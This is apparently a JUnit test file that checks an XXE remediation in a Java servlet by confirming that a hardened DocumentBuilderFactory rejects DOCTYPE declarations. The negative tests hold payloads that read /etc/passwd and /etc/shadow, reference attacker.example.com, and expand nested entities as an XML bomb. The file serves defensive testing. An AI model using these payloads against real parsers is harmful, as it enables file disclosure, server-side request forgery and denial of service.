/*
 * Tests for XXE vulnerability remediation in xxe.java (CWE-611).
 *
 * These tests verify that the DocumentBuilderFactory used in the servlet
 * is configured to reject DTD declarations and external entity references,
 * preventing XML External Entity (XXE) injection attacks.
 */

package org.cysecurity.cspf.jvl.controller;

import org.junit.Test;
import org.junit.Before;
import static org.junit.Assert.*;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.xml.sax.InputSource;
import org.xml.sax.SAXException;
import org.xml.sax.SAXParseException;

/**
 * Security tests confirming that the DocumentBuilderFactory configuration
 * in the xxe servlet disables DTD processing and external entity resolution.
 */
public class xxeTest {

    /**
     * Helper: builds a DocumentBuilderFactory configured exactly as the
     * fixed servlet does (disallow-doctype-decl + all external entity flags
     * disabled + XInclude/expand-entities off).
     */
    private DocumentBuilderFactory createSecureFactory() throws ParserConfigurationException {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // Replicate the exact hardening applied in xxe.java
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
        return factory;
    }

    // -----------------------------------------------------------------------
    // Positive (legitimate XML) tests
    // -----------------------------------------------------------------------

    /**
     * Well-formed XML without a DOCTYPE must parse successfully so that
     * normal application traffic is unaffected by the security hardening.
     */
    @Test
    public void testLegitimateXmlParsesSuccessfully() throws Exception {
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<root><name>Alice</name><value>42</value></root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        InputStream stream = new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        // Should not throw — legitimate XML must still work
        org.w3c.dom.Document doc = builder.parse(is);
        assertNotNull("Parsed document must not be null", doc);
        assertEquals("Root element name must be 'root'", "root", doc.getDocumentElement().getTagName());
    }

    /**
     * Verify that the parser can correctly read child-node text content from
     * a legitimate document — this is the core operation the servlet performs.
     */
    @Test
    public void testChildNodeTextExtraction() throws Exception {
        String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<credentials><username>admin</username><password>s3cret</password></credentials>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        InputStream stream = new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        org.w3c.dom.Document doc = builder.parse(is);
        org.w3c.dom.NodeList nodes = doc.getDocumentElement().getChildNodes();

        boolean foundUsername = false;
        for (int i = 0; i < nodes.getLength(); i++) {
            org.w3c.dom.Node n = nodes.item(i);
            if ("username".equals(n.getNodeName())) {
                assertEquals("admin", n.getFirstChild().getNodeValue());
                foundUsername = true;
            }
        }
        assertTrue("username element must be present in parsed document", foundUsername);
    }

    // -----------------------------------------------------------------------
    // Negative (attack) tests — each must throw, not silently succeed
    // -----------------------------------------------------------------------

    /**
     * An XXE payload that attempts to read a local file via a DOCTYPE entity
     * definition must be rejected.  With disallow-doctype-decl=true the parser
     * throws a SAXParseException before any entity is resolved.
     *
     * Classic attack payload structure:
     *   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     *   <root>&xxe;</root>
     */
    @Test
    public void testXxeFileReadPayloadIsRejected() throws Exception {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<!DOCTYPE foo ["
                + "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
                + "]>"
                + "<root>&xxe;</root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        InputStream stream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        try {
            builder.parse(is);
            fail("Parser must reject an XXE payload with a DOCTYPE declaration");
        } catch (SAXParseException e) {
            // Expected: the DOCTYPE is disallowed by the security feature
            assertTrue(
                "Exception message should indicate DOCTYPE is not allowed",
                e.getMessage() != null && e.getMessage().toLowerCase().contains("doctype")
            );
        }
    }

    /**
     * An XXE payload that references an external URL (SSRF via XML) must also
     * be rejected at the DOCTYPE stage.
     */
    @Test
    public void testXxeRemoteUrlPayloadIsRejected() throws Exception {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<!DOCTYPE foo ["
                + "<!ENTITY xxe SYSTEM \"http://attacker.example.com/evil\">"
                + "]>"
                + "<root>&xxe;</root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        InputStream stream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        try {
            builder.parse(is);
            fail("Parser must reject an XXE payload targeting a remote URL");
        } catch (SAXParseException e) {
            // Expected: DOCTYPE is disallowed
            assertNotNull("Exception must carry a message", e.getMessage());
        }
    }

    /**
     * An XML Bomb (billion-laughs / entity-expansion DoS) also uses a DOCTYPE
     * declaration and must be rejected by the same disallow-doctype-decl guard.
     */
    @Test
    public void testXmlBombPayloadIsRejected() throws Exception {
        String xmlBomb = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<!DOCTYPE lolz ["
                + "<!ENTITY lol \"lol\">"
                + "<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">"
                + "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">"
                + "]>"
                + "<root>&lol3;</root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        InputStream stream = new ByteArrayInputStream(xmlBomb.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        try {
            builder.parse(is);
            fail("Parser must reject an XML bomb (entity-expansion DoS) payload");
        } catch (SAXParseException e) {
            // Expected: DOCTYPE is disallowed
            assertNotNull("Exception must carry a message", e.getMessage());
        }
    }

    /**
     * An external parameter entity injection attack (used to bypass some filters)
     * must also be rejected.
     */
    @Test
    public void testExternalParameterEntityIsRejected() throws Exception {
        String maliciousXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<!DOCTYPE foo ["
                + "<!ENTITY % file SYSTEM \"file:///etc/shadow\">"
                + "%file;"
                + "]>"
                + "<root>test</root>";

        DocumentBuilderFactory factory = createSecureFactory();
        DocumentBuilder builder = factory.newDocumentBuilder();
        InputStream stream = new ByteArrayInputStream(maliciousXml.getBytes(StandardCharsets.UTF_8));
        InputSource is = new InputSource(stream);

        try {
            builder.parse(is);
            fail("Parser must reject an external parameter entity injection");
        } catch (SAXParseException e) {
            // Expected: DOCTYPE is disallowed
            assertNotNull("Exception must carry a message", e.getMessage());
        }
    }

    // -----------------------------------------------------------------------
    // Configuration-level assertions
    // -----------------------------------------------------------------------

    /**
     * Confirm that the disallow-doctype-decl feature is actually set to true
     * on the factory — this is the primary guard against XXE.
     */
    @Test
    public void testDisallowDoctypeDeclFeatureIsEnabled() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertTrue(
            "disallow-doctype-decl feature must be true",
            factory.getFeature("http://apache.org/xml/features/disallow-doctype-decl")
        );
    }

    /**
     * Confirm that external-general-entities is disabled.
     */
    @Test
    public void testExternalGeneralEntitiesFeatureIsDisabled() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "external-general-entities feature must be false",
            factory.getFeature("http://xml.org/sax/features/external-general-entities")
        );
    }

    /**
     * Confirm that external-parameter-entities is disabled.
     */
    @Test
    public void testExternalParameterEntitiesFeatureIsDisabled() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "external-parameter-entities feature must be false",
            factory.getFeature("http://xml.org/sax/features/external-parameter-entities")
        );
    }

    /**
     * Confirm that load-external-dtd is disabled.
     */
    @Test
    public void testLoadExternalDtdFeatureIsDisabled() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse(
            "load-external-dtd feature must be false",
            factory.getFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd")
        );
    }

    /**
     * Confirm that XInclude is disabled on the factory.
     */
    @Test
    public void testXIncludeAwareIsDisabled() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse("XIncludeAware must be false", factory.isXIncludeAware());
    }

    /**
     * Confirm that entity expansion is disabled on the factory.
     */
    @Test
    public void testExpandEntityReferencesIsDisabled() throws ParserConfigurationException {
        DocumentBuilderFactory factory = createSecureFactory();
        assertFalse("ExpandEntityReferences must be false", factory.isExpandEntityReferences());
    }
}
